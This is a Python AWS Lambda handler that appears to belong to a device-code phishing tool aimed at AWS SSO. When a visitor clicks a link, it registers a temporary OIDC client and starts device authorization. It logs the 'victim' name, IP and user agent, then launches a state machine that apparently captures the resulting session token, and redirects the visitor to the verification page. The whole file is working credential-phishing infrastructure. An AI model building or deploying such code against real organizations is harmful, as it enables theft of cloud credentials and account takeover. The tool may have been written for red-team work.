import boto3
import os
import time
import base64
import json

from decimal import Decimal

def create_oidc_application(sso_oidc_client):
    print("Creating temporary AWS SSO OIDC application")
    client = sso_oidc_client.register_client(
        clientName='default',
        clientType='public'
    )
    client_id = client.get('clientId')
    client_secret = client.get('clientSecret')
    return client_id, client_secret


def initiate_device_code_flow(sso_oidc_client,oidc_application, start_url):
    print("Initiating device code flow")
    authz = sso_oidc_client.start_device_authorization(
        clientId=oidc_application[0],
        clientSecret=oidc_application[1],
        startUrl=start_url
    )

    url = authz.get('verificationUriComplete')
    deviceCode = authz.get('deviceCode')
    return url, deviceCode


def create_device_code_url(event, victim, sso_oidc_client, start_url):
    oidc_application = create_oidc_application(sso_oidc_client)
    url, device_code = initiate_device_code_flow(
        sso_oidc_client, oidc_application, start_url)
    try:
        sourceIp = event['requestContext']['identity']['sourceIp']
        userAgent = event['requestContext']['identity']['userAgent']
    except Exception:
        sourceIp = ""
        userAgent = ""

    data={
        'deviceCode': device_code,
        'url': url,
        'urlClicked': Decimal(time.time()),
        'sessionCaptured': False,
        'oidc_app': oidc_application,
        'token': '',
        'urlExpires': Decimal(time.time() + 600),
        'victim': victim,
        'sourceIp': sourceIp,
        'userAgent': str(userAgent)
    }

    return data


def decode_victim_name(url_paramater):
    base64_bytes = url_paramater.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')
    return message


class DecimalEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, Decimal):
            return {'__Decimal__': str(obj)}
        # Let the base class default method raise the TypeError
        return json.JSONEncoder.default(self, obj)
    

def start_state_machine(STATES_ARN, REGION, run_input):
    states = boto3.client('stepfunctions', region_name = 'us-east-1')
    print(run_input)
    print(type(run_input))
    print(json.dumps(run_input, cls=DecimalEncoder))
    try:
        response = states.start_execution(
            stateMachineArn=STATES_ARN,
            input=json.dumps(run_input, cls=DecimalEncoder)
        )
    except Exception as e:
        print(f'ERROR: {e}')
    else:
        return response['executionArn']


def lambda_handler(event, context):
    START_URL = os.environ['STARTURL']
    REGION = os.environ['REGION']
    STATES_ARN = os.environ['STATESARN']

    victim = ""
    try:
        victim = decode_victim_name(str(event['queryStringParameters']['v']))
    except Exception:
        pass

    sso_oidc_client = boto3.client('sso-oidc', region_name=REGION)

    payload = create_device_code_url(event, victim, sso_oidc_client, START_URL)

    start_state_machine(STATES_ARN, REGION, payload)
    print(payload['url'])

    response = {
        "statusCode": 301,
        "headers":{
            "Location": payload['url']
        }
    }

    return response